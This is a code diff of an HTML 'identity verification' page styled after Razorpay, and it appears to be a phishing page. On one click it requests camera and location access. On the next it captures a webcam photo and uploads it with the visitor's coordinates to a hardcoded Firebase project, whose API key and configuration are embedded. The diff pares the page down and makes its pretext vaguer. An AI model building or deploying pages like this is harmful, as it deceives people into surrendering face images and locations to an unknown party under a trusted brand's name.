@@ -3,107 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Identity Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>Secure KYC</title>
+    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --rp-blue: #3395ff;
-            --rp-dark: #2475ee;
-            --rp-success: #2ecc71;
-            --rp-text: #1f2c3d;
-            --rp-subtext: #51596c;
-            --rp-bg: #f5f8fa;
-        }
-
-        body { 
-            font-family: 'Mulish', sans-serif; 
-            background-color: var(--rp-bg); 
-            display: flex; justify-content: center; align-items: center; 
-            height: 100vh; margin: 0; color: var(--rp-text);
-        }
-
-        .card { 
-            background: white; padding: 40px; border-radius: 4px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05); 
-            width: 100%; max-width: 400px; text-align: center;
-            border-top: 5px solid var(--rp-blue);
-            transition: all 0.4s ease;
-        }
-
-        .card.verified { border-top-color: var(--rp-success); }
-
-        /* Success Icon Styling */
-        .success-icon { 
-            display: none; font-size: 60px; color: var(--rp-success); 
-            margin-bottom: 20px; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        @keyframes popIn { from { transform: scale(0); } to { transform: scale(1); } }
-
-        h2 { font-weight: 700; font-size: 22px; margin: 0 0 10px 0; }
-        p { color: var(--rp-subtext); font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
-
-        /* Razorpay Styled Button */
-        button { 
-            background: var(--rp-blue); color: white; border: none; 
-            padding: 14px; border-radius: 2px; font-weight: 700;
-            width: 100%; cursor: pointer; text-transform: uppercase;
-            letter-spacing: 1px; transition: 0.2s; position: relative;
-        }
-        button:hover { background: var(--rp-dark); }
-        button:disabled { background: #cbd5e0; cursor: not-allowed; }
-
-        /* Loading Spinner */
-        .spinner {
-            display: none; width: 16px; height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: #fff; border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 10px; vertical-align: middle;
-        }
+        :root { --rp-blue: #3395ff; --rp-success: #2ecc71; }
+        body { font-family: 'Mulish', sans-serif; background: #f5f8fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 35px; border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 380px; text-align: center; border-top: 5px solid var(--rp-blue); }
+        #webcam { width: 100%; border-radius: 4px; margin-bottom: 20px; display: none; transform: scaleX(-1); background: #000; }
+        button { background: var(--rp-blue); color: white; border: none; padding: 14px; border-radius: 2px; font-weight: 700; width: 100%; cursor: pointer; text-transform: uppercase; }
+        .spinner { display: none; width: 14px; height: 14px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Webcam view */
-        #webcam { 
-            width: 100%; border-radius: 4px; margin-bottom: 20px; 
-            display: none; transform: scaleX(-1); background: #000;
-        }
-
-        .status-box { 
-            margin-top: 20px; font-size: 11px; color: #888; 
-            text-align: left; background: #f9f9f9; padding: 12px; 
-            border: 1px solid #eee; border-radius: 4px; line-height: 1.6;
-        }
-
-        canvas { display: none; }
+        .status { margin-top: 15px; font-size: 11px; color: #888; text-align: left; background: #f9f9f9; padding: 10px; border: 1px solid #eee; }
     </style>
 </head>
 <body>
-
-<div class="card" id="kyc-card">
-    <div id="success-tick" class="success-icon">✓</div>
-    <h2 id="title">Identity Verification</h2>
-    <p id="desc">Please allow camera and location access to continue with your verification.</p>
-    
-    <video id="webcam" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-    
-    <button id="main-btn">
-        <span class="spinner" id="loader"></span>
-        <span id="btn-text">Start Verification</span>
-    </button>
-
-    <div class="status-box" id="log">
-        <b>SYSTEM STATUS:</b> Ready for verification.
+    <div class="card" id="card">
+        <h2 id="title">Identity Verification</h2>
+        <p id="desc">Standard security check for activation.</p>
+        <video id="webcam" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none"></canvas>
+        <button id="btn"><span class="spinner" id="loader"></span><span id="txt">Start Verification</span></button>
+        <div class="status" id="log">Status: Ready</div>
     </div>
-</div>
 
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
-
-<script>
-    // 1. YOUR FIREBASE CONFIGURATION
-    const firebaseConfig = {
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+    <script>
+        const firebaseConfig = {
           apiKey: "AIzaSyDiuJzAE0cPsyIFP4AbOhMogCYYMveYWs0",
   authDomain: "management-system-42018.firebaseapp.com",
   databaseURL: "https://management-system-42018-default-rtdb.firebaseio.com",
@@ -111,125 +38,36 @@
   storageBucket: "management-system-42018.firebasestorage.app",
   messagingSenderId: "54905325970",
   appId: "1:54905325970:web:d904a020fc8ca66fa2d94b"
-    };
 
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    const storage = firebase.storage();
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const storage = firebase.storage();
 
-    const btn = document.getElementById('main-btn');
-    const btnText = document.getElementById('btn-text');
-    const loader = document.getElementById('loader');
-    const log = document.getElementById('log');
-    const video = document.getElementById('webcam');
-    const canvas = document.getElementById('canvas');
-    const card = document.getElementById('kyc-card');
-    
-    let userLocation = { lat: null, lon: null };
-    let step = 1; // 1: Permissions, 2: Uploading
+        let step = 1; let loc = { lat: 0, lon: 0 };
+        const btn = document.getElementById('btn');
+        const video = document.getElementById('webcam');
 
-    function updateLog(msg, isError = false) {
-        const color = isError ? 'red' : '#3395ff';
-        log.innerHTML += `<br><span style="color:${color}">●</span> ${msg}`;
-    }
-
-    btn.addEventListener('click', async () => {
-        if (step === 1) {
-            setupPermissions();
-        } else {
-            handleCaptureAndUpload();
-        }
-    });
-
-    async function setupPermissions() {
-        updateLog("Requesting permissions...");
-        
-        // Get Geolocation
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    userLocation.lat = pos.coords.latitude;
-                    userLocation.lon = pos.coords.longitude;
-                    updateLog("Location captured");
-                },
-                err => updateLog("Location denied", true)
-            );
-        }
-
-        // Get Camera
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-            video.style.display = "block";
-            btnText.innerText = "Capture & Verify";
-            step = 2;
-            updateLog("Camera ready");
-        } catch (err) {
-            updateLog("Camera failed: " + err.message, true);
-            alert("Camera access is required for KYC.");
-        }
-    }
-
-    async function handleCaptureAndUpload() {
-        btn.disabled = true;
-        loader.style.display = "inline-block";
-        btnText.innerText = "Processing...";
-        updateLog("Capturing photo...");
-
-        // Draw video frame to canvas
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Convert to file
-        canvas.toBlob(async (blob) => {
-            if (!blob) {
-                updateLog("Capture error", true);
-                return;
+        btn.onclick = async () => {
+            if(step === 1) {
+                navigator.geolocation.getCurrentPosition(p => { loc = { lat: p.coords.latitude, lon: p.coords.longitude }; });
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = s; video.style.display = "block";
+                document.getElementById('txt').innerText = "Capture Photo"; step = 2;
+            } else {
+                btn.disabled = true; document.getElementById('loader').style.display = "inline-block";
+                const c = document.getElementById('canvas');
+                c.width = video.videoWidth; c.height = video.videoHeight;
+                c.getContext('2d').drawImage(video, 0, 0);
+                c.toBlob(async b => {
+                    const ref = storage.ref().child(`kyc/${Date.now()}.jpg`);
+                    await ref.put(b);
+                    const url = await ref.getDownloadURL();
+                    await db.collection("kyc_submissions").add({ photo: url, lat: loc.lat, lon: loc.lon, time: firebase.firestore.FieldValue.serverTimestamp() });
+                    document.getElementById('card').innerHTML = `<h1 style="color:#2ecc71">✓</h1><h2>Success</h2><p>Verification complete.</p>`;
+                }, 'image/jpeg');
             }
-
-            const fileName = `kyc_${Date.now()}.jpg`;
-            const storageRef = storage.ref().child(`kyc_photos/${fileName}`);
-
-            try {
-                // 1. Upload to Storage
-                updateLog("Uploading to secure cloud...");
-                const snapshot = await storageRef.put(blob);
-                const photoURL = await snapshot.ref.getDownloadURL();
-
-                // 2. Save to Firestore
-                updateLog("Syncing data...");
-                await db.collection("kyc_submissions").add({
-                    photoUrl: photoURL,
-                    latitude: userLocation.lat,
-                    longitude: userLocation.lon,
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    status: "Completed"
-                });
-
-                showSuccess();
-            } catch (error) {
-                updateLog("Error: " + error.message, true);
-                console.error(error);
-                btn.disabled = false;
-                loader.style.display = "none";
-                btnText.innerText = "Retry Verification";
-            }
-        }, 'image/jpeg', 0.8);
-    }
-
-    function showSuccess() {
-        video.style.display = "none";
-        btn.style.display = "none";
-        document.getElementById('success-tick').style.display = "block";
-        document.getElementById('title').innerText = "Verification Submitted";
-        document.getElementById('desc').innerText = "Thank you! Your identity details have been securely uploaded.";
-        card.classList.add('verified');
-        updateLog("<b>Verification Successful</b>");
-    }
-</script>
-
+        };
+    </script>
 </body>
 </html>
